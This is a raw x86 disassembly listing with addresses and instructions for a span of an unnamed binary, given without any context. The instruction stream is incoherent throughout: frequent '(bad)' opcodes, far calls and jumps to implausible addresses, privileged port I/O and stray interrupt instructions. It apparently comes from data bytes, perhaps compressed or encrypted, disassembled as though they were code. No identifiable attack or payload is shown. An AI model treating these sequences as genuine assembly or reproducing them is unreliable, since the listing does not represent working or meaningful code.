  40f0a5:	call   FWORD PTR [esi]
  40f0a7:	jp     0x40f08f
  40f0a9:	adc    DWORD PTR [edi+0x5e89fd89],0x2b75fd86
  40f0b3:	call   0x568:0x87e4fd20
  40f0ba:	mov    ebx,0xd4ff51fe
  40f0bf:	jnp    0x40f07f
  40f0c1:	je     0x40f0c8
  40f0c3:	xor    ch,BYTE PTR [eax-0x9]
  40f0c6:	cli    
  40f0c7:	cs inc esp
  40f0c9:	add    BYTE PTR [edx+0x6c],ah
  40f0cc:	add    ch,bh
  40f0ce:	lods   al,BYTE PTR ds:[esi]
  40f0cf:	xchg   ebx,eax
  40f0d0:	or     eax,0x326c3b46
  40f0d5:	jmp    DWORD PTR [edi+0x64]
  40f0d8:	call   0xe7e7:0x836f483d
  40f0df:	ss test esi,edi
	...
  40f0f2:	add    BYTE PTR [eax],al
  40f0f4:	(bad)
  40f0f7:	inc    BYTE PTR [edi+0x64]
  40f0fa:	call   0xb8c8:0x834f4687
  40f101:	outs   dx,DWORD PTR ds:[esi]
  40f102:	add    dl,BYTE PTR [ebp+0x71]
  40f105:	dec    edi
  40f106:	jg     0x40f0cb
  40f108:	sahf   
  40f109:	push   ds
  40f10a:	sbb    al,BYTE PTR [eax]
  40f10c:	and    BYTE PTR [esi],ah
  40f10e:	test   DWORD PTR [edx+eax*1-0x6c],esi
  40f112:	xlat   BYTE PTR ds:[ebx]
  40f113:	dec    ebx
  40f114:	test   DWORD PTR [esi-0x1d81bb87],ebx
  40f11a:	lds    edx,FWORD PTR [edi+0x22]
  40f11d:	sub    eax,0x6c2d8004
  40f122:	push   cs
  40f123:	push   ecx
  40f124:	shr    BYTE PTR [ecx+0x1efa413c],cl
  40f12a:	pushf  
  40f12b:	jne    0x40f148
  40f12d:	ins    BYTE PTR es:[edi],dx
  40f12e:	add    cl,BYTE PTR [ebx]
  40f130:	cmp    bl,BYTE PTR [edi+0x0]
  40f133:	jmp    0x40f12a
  40f135:	push   ebx
  40f136:	dec    eax
  40f137:	inc    ebp
  40f138:	mov    ebx,0x9fe82b6b
  40f13d:	or     al,0x4
  40f13f:	add    BYTE PTR [ecx],al
  40f141:	sub    al,0xf
  40f143:	and    ecx,ebp
  40f145:	sar    DWORD PTR [edx+0x57],cl
  40f148:	sbb    eax,0x8ebff836
  40f14d:	push   esp
  40f14e:	xor    ch,BYTE PTR [eax-0x6]
  40f151:	add    al,0xe9
  40f153:	xchg   esp,eax
  40f154:	inc    edi
  40f155:	in     al,dx
  40f156:	das    
  40f157:	cmp    eax,0x0
	...
  40f168:	add    BYTE PTR [eax],al
  40f16a:	mov    ebx,0x6e84b904
  40f16f:	or     eax,0x7c690d01
  40f174:	add    eax,0xfdcb9b9b
  40f179:	and    ecx,0x38
  40f17c:	sub    DWORD PTR [edx-0x2c],ecx
  40f17f:	jl     0x40f16e
  40f181:	or     ebx,0xffffffab
  40f184:	and    BYTE PTR [ebx],cl
  40f186:	dec    edi
  40f187:	lods   al,BYTE PTR ds:[esi]
  40f188:	(bad)  
  40f18a:	sar    DWORD PTR [ebx+ebx*2+0xc],0xa2
  40f18f:	add    al,0x1d
  40f191:	sub    DWORD PTR [esp+ebx*8+0x4f946af],0x14
  40f199:	(bad)  
  40f19a:	xchg   ecx,eax
  40f19b:	xchg   BYTE PTR [esp+edx*2-0x6e528374],ch
  40f1a2:	ss jns 0x40f1dd
  40f1a5:	or     DWORD PTR [esi],0x15
  40f1a8:	sahf   
  40f1a9:	stc    
  40f1aa:	icebp  
  40f1ab:	ins    BYTE PTR es:[edi],dx
  40f1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ad:	and    al,0xfa
  40f1af:	add    al,0xe2
  40f1b1:	inc    ebx
  40f1b2:	cld    
  40f1b3:	cmp    DWORD PTR [ebx-0x59fb05fb],0xe90565c9
  40f1bd:	add    edi,edx
  40f1bf:	inc    ebx
  40f1c0:	and    esi,DWORD PTR [esp+ecx*2+0x4]
  40f1c4:	jmp    0xd345c1cc
  40f1c9:	add    edx,eax
  40f1cb:	add    al,0xc3
  40f1cd:	add    eax,DWORD PTR [eax]
	...
  40f1df:	add    BYTE PTR [edi+0x7ed458c2],al
  40f1e5:	cmp    BYTE PTR [eax],0x7b
  40f1e8:	and    al,0x7c
  40f1ea:	cwde   
  40f1eb:	and    BYTE PTR [esi+0x1335ff7c],0x80
  40f1f2:	out    0x4f,eax
  40f1f4:	(bad)  
  40f1f5:	add    al,0x0
  40f1f7:	repnz mov ecx,0x7e1004f7
  40f1fd:	add    al,0x0
  40f1ff:	jmp    0xa8689de5
  40f204:	stc    
  40f205:	jnp    0x40f27b
  40f207:	fst    DWORD PTR [ecx+0x45]
  40f20a:	push   eax
  40f20b:	(bad)  
  40f20c:	js     0x40f1d9
  40f20e:	mov    bl,BYTE PTR [ecx]
  40f210:	imul   eax,DWORD PTR [eax+0x7a78f6ef],0x4f
  40f217:	cmp    edx,DWORD PTR [esi-0x4b]
  40f21a:	push   eax
  40f21b:	fidivr WORD PTR [eax-0x74]
  40f21e:	test   ch,al
  40f220:	xor    BYTE PTR [ebx-0x2],bh
  40f223:	rol    DWORD PTR [eax],0xcb
  40f226:	inc    dh
  40f228:	mov    al,al
  40f22a:	repz sbb DWORD PTR [esi-0x1d7b8de],ecx
  40f231:	jnp    0x40f1e7
  40f233:	mov    ebp,0xa6fe7b10
  40f238:	or     BYTE PTR [edi],0xe8
  40f23b:	icebp  
  40f23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f23d:	jp     0x40f23d
  40f23f:	pusha  
  40f240:	adc    BYTE PTR [ebx-0xa],0x8e
	...
  40f254:	add    BYTE PTR [eax],al
  40f256:	js     0x40f245
  40f258:	call   DWORD PTR [eax]
  40f25a:	les    eax,FWORD PTR cs:[eax-0x17]
  40f25e:	js     0x40f210
  40f260:	jmp    0x40f2e0
  40f262:	js     0x40f2de
  40f264:	(bad)  
  40f265:	hlt    
  40f266:	std    
  40f267:	ins    BYTE PTR es:[edi],dx
  40f268:	in     al,dx
  40f269:	mov    ecx,0x64887a78
  40f26e:	shl    DWORD PTR [edx-0x2],1
  40f271:	push   esi
  40f272:	daa    
  40f273:	jnp    0x40f2db
  40f275:	adc    al,BYTE PTR [ecx-0x3c]
  40f278:	(bad)  
  40f279:	(bad)  
  40f27a:	mov    esp,0xdcf7eabc
  40f27f:	xchg   ch,bh
  40f281:	jne    0x40f2a2
  40f283:	out    dx,eax
  40f284:	rcl    BYTE PTR [eax-0x24],1
  40f287:	xchg   BYTE PTR [edi-0x201087b],al
  40f28d:	dec    DWORD PTR [esi+0xcf7d28c]
  40f293:	xchg   DWORD PTR [esi+0x68],ecx
  40f296:	mov    al,0x4f
  40f298:	aas    
  40f299:	add    ah,bh
  40f29b:	mov    esp,0x84dcf7ea
  40f2a0:	std    
  40f2a1:	jne    0x40f282
  40f2a3:	out    dx,al
  40f2a4:	mov    al,0x50
  40f2a6:	fadd   QWORD PTR [ecx+ecx*1-0x7ce1d840]
  40f2ad:	mov    ebp,0xfffdfc87
  40f2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b3:	jae    0x40f2c3
  40f2b5:	call   DWORD PTR [ebx]
  40f2b7:	xchg   esp,eax
  40f2b8:	and    eax,0x0
	...
  40f2cb:	add    BYTE PTR [esp+eax*4-0x3],ah
  40f2cf:	push   eax
  40f2d0:	retf   
  40f2d1:	add    al,0x4d
  40f2d3:	dec    DWORD PTR [eax+ebp*8+0x12]
  40f2d7:	or     esp,DWORD PTR [ebx+0x7d]
  40f2da:	add    al,0x50
  40f2dc:	imul   esi,DWORD PTR [eax+0x4b],0xffffffff
  40f2e0:	pop    esp
  40f2e1:	int3   
  40f2e2:	and    eax,0xffffff94
  40f2e5:	test   ch,bh
  40f2e7:	adc    eax,0x6a000663
  40f2ec:	push   ebx
  40f2ed:	outs   dx,BYTE PTR ds:[esi]
  40f2ee:	inc    eax
  40f2ef:	inc    edi
  40f2f0:	adc    al,BYTE PTR [ecx]
  40f2f2:	push   DWORD PTR [ebp-0x20381]
  40f2f8:	fdiv   QWORD PTR [ecx+0xa]
  40f2fb:	call   0x3e492f
  40f300:	retf   0xda81
  40f303:	idiv   edx
  40f305:	rol    BYTE PTR [eax-0x1fbc0597],cl
  40f30b:	inc    esi
  40f30c:	mov    ebx,0xeb47f6b
  40f311:	xor    eax,DWORD PTR [ecx+0xeb915fe]
  40f317:	call   0xfec08ec7
  40f31c:	jae    0x40f307
  40f31e:	push   ebx
  40f31f:	idiv   ch
  40f321:	sbb    al,BYTE PTR [ebp-0x7ee52d44]
  40f327:	(bad)  
  40f328:	cli    
  40f329:	pop    edx
  40f32a:	xchg   BYTE PTR [ebx+0x68026bfa],dl
	...
  40f340:	add    BYTE PTR [eax],al
  40f342:	push   ebx
  40f343:	mov    ds:0xa886ffc1,eax
  40f348:	jbe    0x40f399
  40f34a:	int    0x30
  40f34c:	pop    esp
  40f34d:	test   ch,0x62
  40f350:	push   0x6b
  40f352:	dec    eax
  40f353:	pop    ebx
  40f354:	jg     0x40f360
  40f356:	mov    edx,0x2f82ffd7
  40f35b:	push   eax
  40f35c:	add    dh,BYTE PTR [esp+ebp*1-0x11]
  40f360:	mov    ebp,0x7fbaa5e3
  40f365:	dec    DWORD PTR [ecx]
  40f367:	rol    DWORD PTR [esp+edi*4-0x1804d5e],0xfa
  40f36f:	pop    ss
  40f370:	call   0x6facdddc
  40f375:	mov    ebp,0xe80c1875
  40f37a:	call   0x663f74a3
  40f37f:	cmp    BYTE PTR [ebx-0xa],ch
  40f382:	pop    ebp
  40f383:	cli    
  40f384:	jg     0x40f3fa
  40f386:	add    al,BYTE PTR [eax+ecx*2+0x7fea4d48]
  40f38d:	mov    ah,0x5e
  40f38f:	add    al,0x5e
  40f391:	cmp    BYTE PTR [ecx+edi*2],0xd3
  40f395:	or     esp,DWORD PTR [edx]
  40f397:	mov    esp,0x792c809f
  40f39c:	shl    DWORD PTR [edi+0x24],cl
  40f39f:	scas   eax,DWORD PTR es:[edi]
  40f3a0:	and    BYTE PTR [eax+0x1c],bh
  40f3a3:	jns    0x40f3e2
  40f3a5:	test   BYTE PTR [eax],0x0
	...
  40f3b8:	std    
  40f3b9:	ins    BYTE PTR es:[edi],dx
  40f3ba:	mov    cl,0xca
  40f3bc:	or     al,0x79
  40f3be:	sub    eax,0x257125b6
  40f3c3:	cmp    ah,0xee
  40f3c6:	lock imul ebp,DWORD PTR [esi+ecx*8],0x15
  40f3cb:	sub    ah,0xb2
  40f3ce:	sub    al,0x78
  40f3d0:	in     al,0x78
  40f3d2:	add    eax,0x716cf5f6
  40f3d7:	retf   0x78d4
  40f3da:	cmc    
  40f3db:	mov    ch,0xbd
  40f3dd:	jo     0x40f3cc
  40f3df:	jg     0x40f3a5
  40f3e1:	repnz lock imul edi,DWORD PTR [esi],0xffffffce
  40f3e6:	fnstsw WORD PTR [edi-0x4c]
  40f3e9:	mov    dl,0xb0
  40f3eb:	ja     0x40f399
  40f3ed:	js     0x40f3af
  40f3ef:	xchg   DWORD PTR [ecx],esi
  40f3f1:	js     0x40f3b8
  40f3f3:	jg     0x40f45b
  40f3f5:	ins    DWORD PTR es:[edi],dx
  40f3f6:	mov    ch,0x7f
  40f3f8:	xchg   esp,eax
  40f3f9:	ins    DWORD PTR es:[edi],dx
  40f3fa:	xor    al,0xd0
  40f3fc:	mov    WORD PTR [eax-0x53],?
  40f3ff:	mov    ecx,0x7fa570a1
  40f404:	xchg   ebp,eax
  40f405:	imul   BYTE PTR [edi+edi*2]
  40f408:	je     0x40f482
  40f40a:	pop    ebx
  40f40b:	push   0x6c8d7864
  40f410:	(bad)  
  40f412:	test   DWORD PTR [edi+0x5c],edi
  40f415:	mov    dl,0x98
  40f417:	ja     0x40f46d
  40f419:	js     0x40f41a
  40f41b:	add    BYTE PTR [eax],0x0
	...
  40f42e:	xor    esp,ecx
  40f430:	(bad)  
  40f431:	outs   dx,BYTE PTR ds:[esi]
  40f432:	lds    esi,FWORD PTR [eax+0x76bd5eeb]
  40f438:	(bad)  
  40f439:	aam    0x5
  40f43b:	js     0x40f4b1
  40f43d:	loope  0x40f3e0
  40f43f:	inc    ecx
  40f440:	cld    
  40f441:	dec    esi
  40f442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f443:	jbe    0x40f3f9
  40f445:	push   ebp
  40f446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f447:	jbe    0x40f447
  40f449:	push   ecx
  40f44a:	aad    0xc8
  40f44c:	(bad)  
  40f44d:	ss (bad) 
  40f44f:	shl    bh,0x40
  40f452:	mov    al,ds:0x7d26fe78
  40f457:	lock sti 
  40f459:	adc    DWORD PTR [edi+0x3ee90019],eax
  40f45f:	inc    esi
  40f460:	or     ebp,ecx
  40f462:	ret    0xeb8a
  40f465:	push   0x32
  40f467:	mov    WORD PTR fs:[ebp+edx*2-0x4b249838],fs
  40f46f:	(bad)  
  40f470:	inc    DWORD PTR [eax-0x16bf3dd8]
  40f476:	cmp    al,0xf1
  40f478:	or     edx,ecx
  40f47a:	fadd   st(7),st
  40f47c:	(bad)  
  40f47d:	(bad)  
  40f47e:	add    BYTE PTR [ebp+0x73],al
  40f481:	inc    edx
  40f482:	into   
  40f483:	cmp    BYTE PTR [ebp+eax*8-0xb],0xf1
  40f488:	pop    esi
  40f489:	mov    esi,0xb14487c9
  40f48e:	jbe    0x40f488
  40f490:	div    DWORD PTR [ebp+0x0]
	...
  40f4a2:	add    BYTE PTR [eax],al
  40f4a4:	inc    BYTE PTR [eax+eax*1]
  40f4a7:	pop    ds
  40f4a8:	cmc    
  40f4a9:	aas    
  40f4aa:	inc    esp
  40f4ab:	mov    eax,ds:0xe90004ed
  40f4b0:	loopne 0x40f477
  40f4b2:	(bad)  
  40f4b3:	adc    al,0xe6
  40f4b5:	fistp  WORD PTR [ebx]
  40f4b7:	add    BYTE PTR [edx+eax*2],cl
  40f4ba:	dec    BYTE PTR [esi+ebx*1+0x3fe84eed]
  40f4c1:	sbb    DWORD PTR [eax],eax
  40f4c3:	add    al,dl
  40f4c5:	mov    edi,0x94536a0a
  40f4ca:	inc    ebx
  40f4cb:	in     al,0x73
  40f4cd:	imul   edx,ecx,0x46
  40f4d0:	bound  eax,QWORD PTR [ebx]
  40f4d2:	push   DWORD PTR [ebp+0x47]
  40f4d5:	jmp    0x40f4b3
  40f4d7:	dec    esi
  40f4d8:	mov    ah,0xf6
  40f4da:	or     eax,eax
  40f4dc:	dec    edi
  40f4dd:	(bad)  
  40f4df:	push   0xbeef0322
  40f4e4:	arpl   si,si
  40f4e6:	jae    0x40f4f0
  40f4e8:	jmp    0x40f48e
  40f4ea:	imul   edi,edi,0x14
  40f4ed:	jmp    0x4dfd:0xf7044bac
  40f4f4:	or     eax,DWORD PTR [ebx+0x7dd3f87b]
  40f4fa:	mov    dh,0xe8
  40f4fc:	inc    ebx
  40f4fd:	dec    ebx
  40f4fe:	std    
  40f4ff:	call   FWORD PTR [edx]
  40f501:	les    eax,FWORD PTR [esi]
  40f503:	add    BYTE PTR [esi-0x75],ch
  40f506:	jmp    0x0:0x83
	...
  40f519:	add    BYTE PTR [edi+0x49006885],cl
  40f51f:	inc    eax
  40f520:	std    
  40f521:	jne    0x40f4be
  40f523:	jmp    0x4587:0xf8b448c0
  40f52a:	mov    bh,0x69
  40f52c:	out    dx,eax
  40f52d:	inc    esi
  40f52e:	loop   0x40f530
  40f530:	push   DWORD PTR ds:0x412b84
  40f536:	push   esp
  40f537:	outs   dx,BYTE PTR ds:[esi]
  40f538:	push   es
  40f539:	call   0x3e7aa1
  40f53e:	or     esi,edx
  40f540:	inc    esp
  40f541:	inc    ecx
  40f542:	cli    
  40f543:	imul   ebp,edx,0x1
  40f546:	cli    
  40f547:	imul   eax,DWORD PTR [edx+0x6a73e7fe],0xffffffdd
  40f54e:	push   esi
  40f54f:	idiv   DWORD PTR [esi+edi*8+0x7]
  40f553:	scas   eax,DWORD PTR es:[edi]
  40f554:	sub    DWORD PTR [ecx-0x6],eax
  40f557:	out    0xf6,al
  40f559:	pop    es
  40f55a:	push   edx
  40f55b:	adc    eax,0x5435fe7d
  40f560:	add    BYTE PTR [eax],al
  40f562:	cli    
  40f563:	jmp    0x40f5e1
  40f565:	je     0x40f559
  40f567:	ret    
  40f568:	pop    ds
  40f569:	call   FWORD PTR ds:0x16747cbf
  40f56f:	aaa    
  40f570:	test   DWORD PTR [edi],0xfecbf222
  40f576:	add    eax,0xfa034225
  40f57b:	mov    eax,0xeb87
	...
  40f590:	jns    0x40f5b1
  40f592:	pusha  
  40f593:	push   ebp
  40f594:	inc    ebp
  40f595:	add    BYTE PTR [edx],0x6a
  40f598:	xor    al,BYTE PTR [edi]
  40f59a:	test   DWORD PTR [edi],0xfeca9fd2
  40f5a0:	aad    0xf4
  40f5a2:	(bad)  
  40f5a3:	sti    
  40f5a4:	jns    0x40f556
  40f5a6:	gs sub eax,0xf026c3b
  40f5ac:	jbe    0x40f55e
  40f5ae:	add    DWORD PTR [eax],eax
  40f5b0:	cli    
  40f5b1:	jmp    0x4:0x2cdce93d
  40f5b8:	cmc    
  40f5b9:	fild   WORD PTR [edx+0x0]
  40f5bc:	cli    
  40f5bd:	imul   edi,DWORD PTR [edi+0x3c],0xffffff8b
  40f5c1:	add    eax,0x5e8dffc3
  40f5c6:	xchg   BYTE PTR [edx-0x7cfd9405],dh
  40f5cc:	mov    edi,0xbb2d5c04
  40f5d1:	add    al,0xe9
  40f5d3:	or     al,0x76
  40f5d5:	sahf   
  40f5d6:	out    0x3,eax
  40f5d8:	cli    
  40f5d9:	or     ebx,0xe8c40fba
  40f5df:	add    eax,DWORD PTR ds:0xfa025f81
  40f5e5:	add    al,0x6a
  40f5e7:	xchg   DWORD PTR ds:[esi],esp
  40f5ea:	sub    BYTE PTR [edx+edi*8],al
  40f5ed:	add    eax,0x4fa8f6d
  40f5f2:	jmp    0x40f677
	...
  40f603:	add    BYTE PTR [eax],al
  40f605:	add    dh,ch
  40f607:	inc    ebx
  40f608:	push   es
  40f609:	ret    
  40f60a:	and    eax,0x9c87dd75
  40f60f:	add    ebp,ecx
  40f611:	add    edi,DWORD PTR [ecx+0x37]
  40f614:	dec    esp
  40f615:	sub    eax,0xce904bb
  40f61a:	jle    0x40f60e
  40f61c:	out    0x3,eax
  40f61e:	cli    
  40f61f:	in     al,dx
  40f620:	les    edi,FWORD PTR [bp+si]
  40f623:	add    eax,0x1aed0393
  40f628:	or     al,0x2d
  40f62a:	cmp    eax,DWORD PTR ds:0x88e5c660
  40f630:	cmp    DWORD PTR [ebx-0x2b],0x3
  40f634:	gs (bad) 
  40f637:	add    al,0xe9
  40f639:	sub    ah,cl
  40f63b:	fucomi st,st(5)
  40f63d:	cmc    
  40f63e:	lds    esi,FWORD PTR [ebx+edi*8+0x6c]
  40f642:	out    0xc5,eax
  40f644:	call   0xdf4193d7
  40f649:	icebp  
  40f64a:	(bad)  
  40f64b:	pop    ebp
  40f64c:	push   ss
  40f64d:	add    eax,0xd27204fa
  40f652:	add    DWORD PTR [eax-0x107f13ce],eax
  40f658:	inc    DWORD PTR [edi+esi*2-0x3f]
  40f65c:	repz loop 0x40f65f
  40f65f:	add    eax,DWORD PTR [esp+eax*1-0x6ffffb01]
  40f666:	add    BYTE PTR [esi],al
  40f668:	add    cl,ch
	...
  40f67a:	add    BYTE PTR [eax],al
  40f67c:	push   ecx
  40f67d:	mov    BYTE PTR [esi+0x28],al
  40f680:	div    BYTE PTR [ebx+0x36]
  40f683:	xchg   ecx,eax
  40f684:	pop    ds
  40f685:	adc    DWORD PTR [eax],eax
  40f687:	jmp    0x6c4f3b88
  40f68c:	retf   0xfe73
  40f68f:	jmp    0xe948ea08
  40f694:	add    BYTE PTR [ecx+0x4f9e9e9],cl
  40f69a:	(bad)  
  40f69b:	fdivrp st(1),st
  40f69d:	pop    esp
  40f69e:	pop    edi
  40f69f:	mov    ds:0xac8872a0,eax
  40f6a4:	mov    DWORD PTR [edx+0x76],esi
  40f6a7:	icebp  
  40f6a8:	nop
  40f6a9:	clc    
  40f6aa:	out    dx,eax
  40f6ab:	or     DWORD PTR ss:[eax],eax
  40f6ae:	call   0xfeb4231a
  40f6b3:	xchg   ecx,eax
  40f6b4:	or     edx,0x40
  40f6b7:	jmp    0x230f02c
  40f6bc:	push   edi
  40f6bd:	verw   cx
  40f6c0:	in     al,dx
  40f6c1:	inc    esp
  40f6c2:	push   cs
  40f6c3:	ins    BYTE PTR es:[edi],dx
  40f6c4:	mov    dh,BYTE PTR [ebx-0x2]
  40f6c7:	jmp    0xaccc6aab
  40f6cc:	push   ecx
  40f6cd:	les    ecx,FWORD PTR [esp+eiz*4-0x16963bab]
  40f6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6d5:	jae    0x40f72b
  40f6d7:	fimul  WORD PTR [edx]
  40f6d9:	jbe    0x40f708
  40f6db:	sub    dh,bh
  40f6dd:	(bad)  
  40f6de:	mov    edi,0xde
	...
  40f6ef:	add    BYTE PTR [eax],al
  40f6f1:	add    BYTE PTR ds:0xa3ffff9b,bl
  40f6f7:	pop    es
  40f6f8:	lea    eax,[ebp-0x49]
  40f6fb:	push   edi
  40f6fc:	std    
  40f6fd:	jne    0x40f6ba
  40f6ff:	out    dx,al
  40f700:	jae    0x40f6ee
  40f702:	dec    esp
  40f703:	adc    al,0xb5
  40f705:	and    cl,BYTE PTR cs:[ecx]
  40f708:	or     eax,eax
  40f70a:	pop    es
  40f70b:	jno    0x40f698
  40f70d:	inc    ebp
  40f70e:	jae    0x40f767
  40f710:	push   0x6a08f900
  40f715:	pop    es
  40f716:	jmp    0x77b6f623
  40f71b:	out    dx,al
  40f71c:	adc    edi,DWORD PTR [ecx+0xafe483d]
  40f722:	xchg   ebx,eax
  40f723:	arpl   WORD PTR [edi+edi*8+0x56],dx
  40f727:	out    0xe6,eax
  40f729:	call   0x8a3ee598
  40f72e:	push   esi
  40f72f:	fisttp DWORD PTR [ebx-0x2a84cbb]
  40f735:	jne    0x40f716
  40f737:	popa   
  40f738:	(bad)  
  40f739:	imul   edx,DWORD PTR [ecx+eiz*2],0xd346fefe
  40f740:	std    
  40f741:	adc    eax,0x411d8a
  40f746:	call   0x8b6a6a11
  40f74b:	push   es
  40f74c:	add    bh,ch
  40f74e:	dec    ebp
  40f74f:	out    dx,eax
  40f750:	jae    0x40f75a
  40f752:	sti    
  40f753:	xor    eax,0xff46
	...
  40f768:	cld    
  40f769:	out    dx,al
  40f76a:	je     0x40f774
  40f76c:	int3   
  40f76d:	jne    0x40f771
  40f76f:	inc    DWORD PTR [esi-0x2]
  40f772:	out    0x58,eax
  40f774:	xchg   ebp,eax
  40f775:	out    dx,eax
  40f776:	std    
  40f777:	call   DWORD PTR [esi-0x17]
  40f77a:	std    
  40f77b:	jne    0x40f7ec
  40f77d:	in     al,dx
  40f77e:	jae    0x40f788
  40f780:	cli    
  40f781:	inc    ebx
  40f782:	int    0x45
  40f784:	popf   
  40f785:	inc    ebx
  40f786:	js     0x40f7fc
  40f788:	mov    dh,0x54
  40f78a:	test   BYTE PTR [eax-0x73],cl
  40f78d:	mov    bl,0x78
  40f78f:	je     0x40f72f
  40f791:	mov    ebx,0x1cccbd0e
  40f796:	add    al,0x6a
  40f798:	cli    
  40f799:	stos   BYTE PTR es:[edi],al
  40f79a:	out    dx,al
  40f79b:	jmp    0x40f80a
  40f79d:	jns    0x40f7e0
  40f79f:	sub    eax,0x74775bbb
  40f7a4:	push   0xffffff84
  40f7a6:	loopne 0x40f7f0
  40f7a8:	push   ebp
  40f7a9:	mov    eax,DWORD PTR [esi+eax*8-0xc390d16]
  40f7b0:	jns    0x40f82b
  40f7b2:	outs   dx,BYTE PTR ds:[esi]
  40f7b3:	(bad)  
  40f7b4:	in     al,dx
  40f7b5:	call   0xeb76f525
  40f7ba:	push   0xffffffb4
  40f7bc:	sub    al,0xd3
  40f7be:	js     0x40f829
  40f7c0:	cli    
  40f7c1:	(bad)  
  40f7c3:	neg    DWORD PTR ds:0xbb2d6579
  40f7c9:	pop    ebx
  40f7ca:	ja     0x40f840
	...
  40f7dc:	add    BYTE PTR [eax],al
  40f7de:	push   cs
  40f7df:	xor    ebp,edi
  40f7e1:	pop    es
  40f7e2:	adc    dh,dh
  40f7e4:	sar    esi,0xfd
  40f7e7:	sbb    al,0xc8
  40f7ea:	mov    eax,0x8155025f
  40f7ef:	inc    DWORD PTR [edx+0x7912c6c3]
  40f7f5:	(bad)  
  40f7f6:	outs   dx,DWORD PTR ds:[esi]
  40f7f7:	test   al,0x76
  40f7f9:	dec    edi
  40f7fa:	aad    0xf0
  40f7fc:	push   es
  40f7fd:	inc    DWORD PTR [edi]
  40f7ff:	mov    bl,0x29
  40f801:	inc    ecx
  40f802:	cli    
  40f803:	add    edi,ebp
  40f805:	sbb    bh,dl
  40f807:	pop    ebx
  40f808:	or     eax,eax
  40f80a:	add    eax,0xfaa86c05
  40f80f:	add    al,0xe9
  40f811:	inc    eax
  40f812:	ds ins DWORD PTR es:[edi],dx
  40f814:	call   0xa645f21c
  40f819:	mov    esi,0x3ed7189
  40f81e:	cli    
  40f81f:	fsubp  st(0),st
  40f821:	in     eax,dx
  40f822:	test   ebx,ebx
  40f824:	call   0x23c17616
  40f829:	jo     0x40f7f0
  40f82b:	jg     0x40f898
  40f82d:	outs   dx,DWORD PTR ds:[esi]
  40f82e:	fs jno 0x40f7ce
  40f831:	shl    DWORD PTR [edi+esi*8-0x70],cl
  40f835:	js     0x40f81d
  40f837:	jo     0x40f7b9
  40f839:	(bad)  
  40f83a:	lock add al,0xe9
  40f83d:	or     al,0x3a
  40f83f:	clc    
  40f840:	jecxz  0x40f8ac
	...
  40f852:	add    BYTE PTR [eax],al
  40f854:	retf   
  40f855:	add    ebp,ecx
  40f857:	add    edx,edx
  40f859:	mov    ah,0xc0
  40f85b:	ret    0x7235
  40f85e:	fild   DWORD PTR [edi]
  40f860:	and    dh,ah
  40f862:	lods   al,BYTE PTR ds:[esi]
  40f863:	js     0x40f889
  40f865:	aam    0x61
  40f867:	push   ebx
  40f868:	outs   dx,BYTE PTR ds:[esi]
  40f869:	xchg   DWORD PTR [eax+esi*2+0x14],edx
  40f86d:	jno    0x40f807
  40f86f:	aad    0x15
  40f871:	in     al,0xac
  40f873:	js     0x40f879
  40f875:	jnp    0x40f8e2
  40f877:	push   edi
  40f878:	add    al,0x71
  40f87a:	sub    eax,0x25bdaf6b
  40f87f:	js     0x40f8e4
  40f881:	add    eax,0xc63cbd91
  40f886:	call   0x15929f03
  40f88b:	js     0x40f861
  40f88d:	jo     0x40f84a
  40f88f:	cmp    BYTE PTR [ebx],ah
  40f891:	(bad)  
  40f892:	call   0xfffd8802
  40f897:	cmc    
  40f898:	inc    ebp
  40f899:	jge    0x40f81f
  40f89b:	stc    
  40f89c:	and    eax,0xf653fe6f
  40f8a1:	fdivr  QWORD PTR [esi-0x28f40da]
  40f8a7:	pushf  
  40f8a8:	inc    edx
  40f8a9:	ja     0x40f8a9
  40f8ab:	into   
  40f8ac:	or     eax,0xb7103f39
  40f8b1:	jo     0x40f899
  40f8b3:	popa   
  40f8b4:	mov    cl,0x6f
  40f8b6:	(bad)  
  40f8b7:	pusha  
	...
  40f8c8:	add    BYTE PTR [eax],al
  40f8ca:	jnp    0x40f928
  40f8cc:	imul   BYTE PTR [esi+0x10ffdded]
  40f8d2:	mov    edx,0xece940c6
  40f8d7:	mov    eax,0x6ee59edb
  40f8dc:	(bad)  
  40f8dd:	aam    0xc
  40f8df:	push   ds
  40f8e0:	inc    ecx
  40f8e1:	jmp    0x7e8be6c7
  40f8e6:	int    0x7c
  40f8e8:	test   BYTE PTR [ecx+0x3fe6ecd],al
  40f8ee:	(bad)  
  40f8ef:	fmul   st(0),st
  40f8f1:	scas   al,BYTE PTR es:[edi]
  40f8f2:	ss jo  0x40f8f2
  40f8f5:	xchg   esp,eax
  40f8f6:	ret    0xfe76
  40f8f9:	push   esi
  40f8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8fb:	cmp    BYTE PTR [edi],bh
  40f8fd:	add    BYTE PTR [edi],bh
  40f8ff:	jo     0x40f8e7
  40f901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f902:	inc    eax
  40f903:	outs   dx,DWORD PTR ds:[esi]
  40f904:	(bad)  
  40f905:	jo     0x40f982
  40f907:	div    BYTE PTR fs:[esi]
  40f90a:	test   ebp,ebx
  40f90c:	inc    eax
  40f90e:	aas    
  40f90f:	mov    DWORD PTR [eax-0x17],0x16dbb964
  40f916:	ins    DWORD PTR es:[edi],dx
  40f917:	outs   dx,DWORD PTR ds:[esi]
  40f918:	(bad)  
  40f919:	fsub   QWORD PTR [esi+ebx*1]
  40f91c:	inc    ecx
  40f91d:	jmp    0x8c2b83
  40f922:	hlt    
  40f923:	test   DWORD PTR [edi-0x2200c7b],0xeaae50ff
  40f92d:	test   DWORD PTR [eax],0x0
	...
  40f93f:	add    BYTE PTR [esi+esi*8+0x60f073fe],ah
  40f946:	(bad)  
  40f947:	push   DWORD PTR [ecx+edi*4-0x24648a03]
  40f94e:	xchg   ecx,eax
  40f94f:	inc    esp
  40f950:	(bad)  
  40f951:	idiv   ch
  40f953:	mov    ch,0x53
  40f955:	fdivp  st(5),st
  40f957:	inc    DWORD PTR [esp+esi*2+0x6]
  40f95b:	call   0x3ea90c
  40f960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f961:	mov    ah,0xea
  40f963:	not    DWORD PTR [esi+esi*8-0x24948a03]
